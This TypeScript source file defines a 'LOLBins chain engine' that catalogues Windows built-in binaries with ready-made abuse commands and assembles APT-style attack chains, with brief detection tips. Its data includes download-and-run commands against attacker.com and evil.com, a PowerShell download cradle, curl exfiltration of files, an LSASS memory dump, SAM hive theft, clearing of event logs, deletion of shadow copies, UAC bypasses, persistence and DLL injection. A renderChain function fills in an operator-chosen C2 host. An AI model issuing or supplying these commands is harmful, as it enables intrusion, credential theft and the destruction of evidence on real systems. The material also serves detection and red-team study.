/**
 * LOLBins Chain Engine (port of `modules.lolbins`).
 *
 * Maps 20+ high-abuse LOLBAS binaries, builds attack chains, generates
 * execution commands, and provides detection guidance — based on real APT
 * usage (Flax Typhoon, Mustang Panda, TA505, Earth Preta). Command strings
 * only — nothing is executed here.
 */

export type LOLBinCategory =
  | "download" | "execute" | "inject" | "persist" | "evade" | "discover"
  | "collect" | "exfil" | "c2" | "uac_bypass";

export interface LOLBin {
  name: string;
  path: string;
  description: string;
  categories: LOLBinCategory[];
  mitre_ids: string[];
  os: string;
  abusable_args: string[];
  example_chains: string[];
  detection: string;
  apts_using: string[];
  severity: string;
}

export interface LOLBinChain {
  name: string;
  description: string;
  steps: Array<{ phase: string; binary: string; command: string }>;
  mitre_ids: string[];
  phase: string;
  stealth: string;
  apts_using: string[];
  detection_guidance: string;
}

export class LOLBinsEngine {
  bins: Map<string, LOLBin>;
  chains: LOLBinChain[];

  constructor() {
    this.bins = this.buildDatabase();
    this.chains = this.buildChains();
  }

  private buildDatabase(): Map<string, LOLBin> {
    const bins = new Map<string, LOLBin>();
    const add = (b: LOLBin): void => {
      bins.set(b.name, b);
    };

    add({
      name: "certutil.exe",
      path: "C:\\Windows\\System32\\certutil.exe",
      description: "Certificate utility - download, encode, decode",
      categories: ["download", "evade"],
      mitre_ids: ["T1105", "T1027"],
      os: "windows",
      abusable_args: ["-urlcache", "-split", "-f", "-encode", "-decode"],
      example_chains: [
        "certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\\Temp\\p.exe",
        "certutil.exe -encode C:\\Temp\\payload.exe C:\\Temp\\payload.b64",
      ],
      detection: "Monitor certutil.exe with -urlcache or -encode flags. Event ID 4688 with command-line logging.",
      apts_using: ["Lazarus", "APT29", "Volt Typhoon"],
      severity: "high",
    });
    add({
      name: "bitsadmin.exe",
      path: "C:\\Windows\\System32\\bitsadmin.exe",
      description: "Background Intelligent Transfer Service",
      categories: ["download", "exfil"],
      mitre_ids: ["T1105", "T1027"],
      os: "windows",
      abusable_args: ["/transfer", "/create", "/addfile", "/resume", "/complete"],
      example_chains: [
        "bitsadmin /transfer job /download /priority high http://attacker.com/p.exe C:\\Temp\\p.exe",
      ],
      detection: "Monitor bitsadmin.exe with /transfer or /create. Event ID 4688.",
      apts_using: ["APT29", "Sandworm"],
      severity: "medium",
    });
    add({
      name: "mshta.exe",
      path: "C:\\Windows\\System32\\mshta.exe",
      description: "Microsoft HTML Application host",
      categories: ["execute", "evade"],
      mitre_ids: ["T1218.005"],
      os: "windows",
      abusable_args: ["javascript:", "vbscript:", "about:"],
      example_chains: [
        "mshta.exe \"javascript:var sh=new ActiveXObject('WScript.Shell');sh.Run('cmd /c whoami',0);window.close();\"",
      ],
      detection: "Monitor mshta.exe executing inline scripts. Parent-child anomalies.",
      apts_using: ["APT29", "Turla", "OilRig"],
      severity: "high",
    });
    add({
      name: "rundll32.exe",
      path: "C:\\Windows\\System32\\rundll32.exe",
      description: "DLL loader - execute DLL exports",
      categories: ["execute", "evade", "inject"],
      mitre_ids: ["T1218.011", "T1055.001"],
      os: "windows",
      abusable_args: ["javascript:", "jar:", "mshtml:"],
      example_chains: [
        "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication\";document.write();",
        "rundll32.exe C:\\Temp\\evil.dll,EntryPoint",
        "rundll32.exe C:\\Windows\\Temp\\test.dll,DllRegisterServer",
      ],
      detection: "Monitor rundll32.exe with unusual DLL paths or javascript: protocol. Sysmon Event ID 1.",
      apts_using: ["APT28", "APT29", "Lazarus", "Mustang Panda"],
      severity: "critical",
    });
    add({
      name: "msiexec.exe",
      path: "C:\\Windows\\System32\\msiexec.exe",
      description: "Windows Installer - execute MSI packages",
      categories: ["execute", "download"],
      mitre_ids: ["T1218.007"],
      os: "windows",
      abusable_args: ["/i", "/q", "/quiet", "/passive"],
      example_chains: [
        "msiexec.exe /i http://attacker.com/payload.msi /quiet /norestart",
        "msiexec.exe /q /i C:\\Temp\\evil.msi",
      ],
      detection: "Monitor msiexec.exe with remote URLs or unusual MSI paths. Event ID 4688.",
      apts_using: ["APT29", "Earth Preta"],
      severity: "high",
    });
    add({
      name: "regsvr32.exe",
      path: "C:\\Windows\\System32\\regsvr32.exe",
      description: "Registry server - register/unregister DLLs",
      categories: ["execute", "evade"],
      mitre_ids: ["T1218.010"],
      os: "windows",
      abusable_args: ["/s", "/i:", "/n", "/u"],
      example_chains: [
        "regsvr32.exe /s /n /u /i:http://attacker.com/scrobj.dll scrobj.dll",
        "regsvr32.exe /s /i:http://evil.com/payload.sct scrobj.dll",
      ],
      detection: "Monitor regsvr32.exe with /i flag and remote URLs. Squiblydoo technique.",
      apts_using: ["APT29", "Sandworm", "Lazarus"],
      severity: "high",
    });
    add({
      name: "MAVInject.exe",
      path: "C:\\Windows\\System32\\mavinject.exe",
      description: "Microsoft Application Virtualization Injector",
      categories: ["inject", "evade"],
      mitre_ids: ["T1218.013"],
      os: "windows",
      abusable_args: ["/INJECTRUNNING"],
      example_chains: [
        "mavinject.exe <PID> /INJECTRUNNING C:\\Windows\\Temp\\evil.dll",
        "mavinject.exe <PID> /INJECTRUNNING C:\\Windows\\Temp\\legit.log:hidden.dll",
      ],
      detection: "Monitor mavinject.exe with /INJECTRUNNING flag. Sysmon Event ID 8 (CreateRemoteThread).",
      apts_using: ["Mustang Panda", "Earth Preta"],
      severity: "critical",
    });
    add({
      name: "powershell.exe",
      path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      description: "PowerShell - .NET automation framework",
      categories: ["execute", "download", "c2", "evade"],
      mitre_ids: ["T1059.001", "T1059.007"],
      os: "windows",
      abusable_args: ["-enc", "-EncodedCommand", "-nop", "-noni", "-w hidden", "IEX", "Invoke-WebRequest", "DownloadString"],
      example_chains: [
        "powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAA...==",
        "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
        "powershell -ep bypass -c Get-History | Out-File C:\\Temp\\hist.txt",
      ],
      detection: "Monitor PowerShell with -EncodedCommand, -enc, or DownloadString. Script Block Logging (Event ID 4104).",
      apts_using: ["ALL APTs"],
      severity: "critical",
    });
    add({
      name: "cmd.exe",
      path: "C:\\Windows\\System32\\cmd.exe",
      description: "Windows Command Shell",
      categories: ["execute", "discover"],
      mitre_ids: ["T1059.003"],
      os: "windows",
      abusable_args: ["/c", "/k", "type", "copy", "del", "dir", "net", "ipconfig", "systeminfo"],
      example_chains: [
        "cmd /c whoami && ipconfig && net user",
        "cmd /c type C:\\Users\\admin\\Documents\\passwords.txt",
      ],
      detection: "Monitor cmd.exe spawned by unusual parents. Command-line logging.",
      apts_using: ["ALL APTs"],
      severity: "medium",
    });
    add({
      name: "schtasks.exe",
      path: "C:\\Windows\\System32\\schtasks.exe",
      description: "Task Scheduler - create scheduled tasks",
      categories: ["persist"],
      mitre_ids: ["T1053.005"],
      os: "windows",
      abusable_args: ["/create", "/tn", "/tr", "/sc", "/mo", "/st"],
      example_chains: [
        "schtasks /create /tn Backdoor /tr C:\\Temp\\payload.exe /sc minute /mo 5",
        "schtasks /create /tn Update /tr 'cmd /c powershell -enc ...' /sc daily /st 09:00",
      ],
      detection: "Monitor schtasks.exe with /create flag. Event ID 4698 (Scheduled task created).",
      apts_using: ["APT29", "Turla", "Gamaredon"],
      severity: "high",
    });
    add({
      name: "reg.exe",
      path: "C:\\Windows\\System32\\reg.exe",
      description: "Registry Console Tool - modify registry",
      categories: ["persist", "evade"],
      mitre_ids: ["T1574.001", "T1112"],
      os: "windows",
      abusable_args: ["add", "save", "load", "import"],
      example_chains: [
        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /d C:\\Temp\\p.exe",
        "reg save HKLM\\SAM C:\\Temp\\sam.hive",
        "reg save HKLM\\SYSTEM C:\\Temp\\system.hive",
      ],
      detection: "Monitor registry Run key modifications. Event ID 4657.",
      apts_using: ["APT28", "APT29", "Lazarus"],
      severity: "high",
    });
    add({
      name: "comsvcs.dll",
      path: "C:\\Windows\\System32\\comsvcs.dll",
      description: "COM+ Services - minidump via rundll32",
      categories: ["execute", "evade"],
      mitre_ids: ["T1003.001", "T1218.011"],
      os: "windows",
      abusable_args: ["MiniDump"],
      example_chains: [
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass PID> C:\\Temp\\dump.bin full",
      ],
      detection: "Monitor rundll32.exe loading comsvcs.dll with MiniDump. LSASS access.",
      apts_using: ["APT29", "Lazarus", "Volt Typhoon"],
      severity: "critical",
    });
    add({
      name: "wevtutil.exe",
      path: "C:\\Windows\\System32\\wevtutil.exe",
      description: "Windows Event Log utility - clear/modify logs",
      categories: ["evade"],
      mitre_ids: ["T1070.001"],
      os: "windows",
      abusable_args: ["cl", "clear-log", "qe", "query-events"],
      example_chains: [
        "wevtutil cl Security",
        "wevtutil cl System",
        "wevtutil cl Application",
      ],
      detection: "Monitor wevtutil.exe with 'cl' or 'clear-log' commands. Event ID 1102 (log cleared).",
      apts_using: ["APT28", "APT29", "Sandworm"],
      severity: "high",
    });
    add({
      name: "vssadmin.exe",
      path: "C:\\Windows\\System32\\vssadmin.exe",
      description: "Volume Shadow Copy - delete shadow copies",
      categories: ["evade", "execute"],
      mitre_ids: ["T1490"],
      os: "windows",
      abusable_args: ["delete shadows", "list shadows"],
      example_chains: ["vssadmin.exe delete shadows /all /quiet"],
      detection: "Monitor vssadmin.exe with 'delete shadows'. Event ID 514.",
      apts_using: ["APT28", "Sandworm", "Lazarus"],
      severity: "high",
    });
    add({
      name: "ipconfig.exe",
      path: "C:\\Windows\\System32\\ipconfig.exe",
      description: "IP Configuration - network discovery",
      categories: ["discover"],
      mitre_ids: ["T1016"],
      os: "windows",
      abusable_args: ["/all", "/displaydns", "/flushdns"],
      example_chains: ["ipconfig /all", "ipconfig /displaydns"],
      detection: "Monitor ipconfig.exe with /all flag from unusual parent processes.",
      apts_using: ["ALL APTs"],
      severity: "low",
    });
    add({
      name: "net.exe",
      path: "C:\\Windows\\System32\\net.exe",
      description: "Net Command - user/share/service management",
      categories: ["discover", "collect"],
      mitre_ids: ["T1016.001", "T1018", "T1135", "T1069.001"],
      os: "windows",
      abusable_args: ["user", "group", "localgroup", "share", "use", "session", "statistics"],
      example_chains: [
        "net user",
        "net localgroup administrators",
        "net share",
        "net use \\\\target\\IPC$ /user:admin password",
        "net session",
      ],
      detection: "Monitor net.exe with user/group/share commands. Event ID 4624, 4620.",
      apts_using: ["ALL APTs"],
      severity: "medium",
    });
    add({
      name: "whoami.exe",
      path: "C:\\Windows\\System32\\whoami.exe",
      description: "Who Am I - current user context",
      categories: ["discover"],
      mitre_ids: ["T1033"],
      os: "windows",
      abusable_args: ["/all", "/priv", "/groups", "/user"],
      example_chains: ["whoami /all", "whoami /priv"],
      detection: "Low signal - use in correlation with other discovery commands.",
      apts_using: ["ALL APTs"],
      severity: "low",
    });
    add({
      name: "curl.exe",
      path: "C:\\Windows\\System32\\curl.exe",
      description: "cURL - HTTP client (native Windows 10+)",
      categories: ["download", "exfil", "c2"],
      mitre_ids: ["T1105", "T1048"],
      os: "windows",
      abusable_args: ["-d", "-T", "--upload-file", "-X"],
      example_chains: [
        "curl.exe -d @C:\\Temp\\data.txt http://attacker.com/upload",
        "curl.exe -T C:\\Temp\\loot.zip http://attacker.com/exfil",
      ],
      detection: "Monitor curl.exe with -d or -T flags to external hosts. Network Event ID 3.",
      apts_using: ["Flax Typhoon", "APT29"],
      severity: "medium",
    });
    add({
      name: "tar.exe",
      path: "C:\\Windows\\System32\\tar.exe",
      description: "Tape Archive - compress/extract files",
      categories: ["collect", "exfil"],
      mitre_ids: ["T1560"],
      os: "windows",
      abusable_args: ["-cf", "-xf", "-czf", "-cjf"],
      example_chains: ["tar -czf C:\\Temp\\loot.tar.gz C:\\Users\\admin\\Documents"],
      detection: "Monitor tar.exe creating archives of sensitive directories.",
      apts_using: ["Flax Typhoon"],
      severity: "medium",
    });
    add({
      name: "fodhelper.exe",
      path: "C:\\Windows\\System32\\fodhelper.exe",
      description: "Features on Demand helper - UAC bypass via registry",
      categories: ["uac_bypass", "persist"],
      mitre_ids: ["T1548.002"],
      os: "windows",
      abusable_args: [],
      example_chains: [
        'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd /c whoami" /f',
        "fodhelper.exe",
      ],
      detection: "Monitor fodhelper.exe with ms-settings registry key. Event ID 4657.",
      apts_using: ["APT29", "Lazarus"],
      severity: "high",
    });
    add({
      name: "eventvwr.exe",
      path: "C:\\Windows\\System32\\eventvwr.exe",
      description: "Event Viewer - UAC bypass via registry",
      categories: ["uac_bypass"],
      mitre_ids: ["T1548.002"],
      os: "windows",
      abusable_args: [],
      example_chains: [
        'reg add HKCU\\Software\\Classes\\mscfile\\Shell\\Open\\command /d "cmd /c whoami" /f',
        "eventvwr.exe",
      ],
      detection: "Monitor eventvwr.exe with mscfile registry key.",
      apts_using: ["APT29"],
      severity: "high",
    });

    return bins;
  }

  private buildChains(): LOLBinChain[] {
    const chains: LOLBinChain[] = [];
    const chain = (
      name: string, description: string, phase: string, stealth: string,
      mitre_ids: string[], apts_using: string[], detection_guidance: string,
      steps: Array<{ phase: string; binary: string; command: string }>,
    ): void => {
      chains.push({ name, description, steps, mitre_ids, phase, stealth, apts_using, detection_guidance });
    };

    chain(
      "Flax Typhoon LOLBins Chain",
      "Pure LOLBins from initial access to persistence (observed Jan 2026)",
      "initial_access", "high",
      ["T1105", "T1218.011", "T1053.005", "T1070.001"],
      ["Flax Typhoon"],
      "Monitor certutil + rundll32 + schtasks chain. Look for schtasks with rundll32 payload.",
      [
        { phase: "download", binary: "certutil.exe", command: "certutil.exe -urlcache -split -f http://{c2}/payload.exe C:\\Windows\\Temp\\update.exe" },
        { phase: "execute", binary: "rundll32.exe", command: "rundll32.exe C:\\Windows\\Temp\\payload.dll,EntryPoint" },
        { phase: "persist", binary: "schtasks.exe", command: "schtasks /create /tn MicrosoftEdgeUpdateTaskMachineCore /tr 'rundll32.exe C:\\Windows\\Temp\\payload.dll,EntryPoint' /sc minute /mo 30" },
        { phase: "evasion", binary: "wevtutil.exe", command: "wevtutil cl Security" },
      ],
    );

    chain(
      "MAVInject DLL Injection",
      "Microsoft App Virtualization Injector for stealthy DLL injection (Feb 2025)",
      "execution", "critical",
      ["T1105", "T1218.013", "T1055.001"],
      ["Mustang Panda", "Earth Preta"],
      "Monitor mavinject.exe with /INJECTRUNNING. ADS file staging.",
      [
        { phase: "execute", binary: "cmd.exe", command: "cmd /c mkdir C:\\Windows\\Temp\\cache" },
        { phase: "download", binary: "certutil.exe", command: "certutil.exe -urlcache -split -f http://{c2}/app.dll C:\\Windows\\Temp\\cache\\app.log" },
        { phase: "inject", binary: "mavinject.exe", command: "mavinject.exe <PID> /INJECTRUNNING C:\\Windows\\Temp\\cache\\app.log:hidden.dll" },
      ],
    );

    chain(
      "Remcos Staging Chain",
      "Malware-free multi-hop staging (Remcos/NetSupport 2024-2026)",
      "execution", "medium",
      ["T1202", "T1218.005", "T1105"],
      ["Remcos", "NetSupport"],
      "Monitor forfiles spawning mshta; curl/tar file activity in %TEMP%.",
      [
        { phase: "execute", binary: "forfiles.exe", command: 'forfiles.exe /p C:\\Windows /m *.log /c "cmd.exe /c mshta.exe vbscript:Close(Execute(""GetObject(""script:{c2}/payload.sct"")""))"' },
        { phase: "download", binary: "curl.exe", command: "curl.exe -s -o C:\\Windows\\Temp\\stage.zip {c2}/stage.zip" },
        { phase: "collect", binary: "tar.exe", command: "tar.exe -xf C:\\Windows\\Temp\\stage.zip -C C:\\Windows\\Temp\\" },
      ],
    );

    chain(
      "Squiblydoo AppLocker Bypass",
      "regsvr32 executes a remote scriptlet via scrobj.dll",
      "defense_evasion", "high",
      ["T1218.010"],
      ["APT29", "Sandworm"],
      "Monitor regsvr32.exe with /i flag and remote URLs.",
      [
        { phase: "evasion", binary: "regsvr32.exe", command: "regsvr32.exe /s /n /u /i:{c2}/payload.sct scrobj.dll" },
      ],
    );

    chain(
      "LSASS Dump via comsvcs",
      "rundll32 comsvcs MiniDump of LSASS",
      "credential_access", "high",
      ["T1003.001", "T1218.011"],
      ["APT29", "Lazarus", "Volt Typhoon"],
      "Monitor rundll32 loading comsvcs.dll with MiniDump; LSASS process access.",
      [
        { phase: "cred_access", binary: "comsvcs.dll", command: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass PID> C:\\Temp\\dump.bin full" },
      ],
    );

    chain(
      "Log Clearing",
      "Post-operation event log clearing",
      "defense_evasion", "medium",
      ["T1070.001"],
      ["APT28", "APT29", "Sandworm"],
      "Monitor wevtutil cl commands; Event ID 1102.",
      [
        { phase: "evasion", binary: "wevtutil.exe", command: "wevtutil cl Security" },
        { phase: "evasion", binary: "wevtutil.exe", command: "wevtutil cl System" },
      ],
    );

    return chains;
  }

  search(query: string): LOLBin[] {
    const q = query.toLowerCase();
    return [...this.bins.values()].filter(
      (b) => b.name.includes(q) || b.description.toLowerCase().includes(q) || b.categories.some((c) => c.includes(q)),
    );
  }

  byCategory(category: LOLBinCategory): LOLBin[] {
    return [...this.bins.values()].filter((b) => b.categories.includes(category));
  }

  byMitre(mitreId: string): LOLBin[] {
    return [...this.bins.values()].filter((b) => b.mitre_ids.includes(mitreId));
  }

  renderChain(name: string, facts: Record<string, string> = {}): Array<{ phase: string; binary: string; command: string }> {
    const chain = this.chains.find((c) => c.name === name);
    if (!chain) throw new Error(`unknown chain: ${name}`);
    return chain.steps.map((step) => ({
      phase: step.phase,
      binary: step.binary,
      command: step.command.replace(/\{c2\}/g, facts["c2"] ?? "https://example.invalid"),
    }));
  }
}
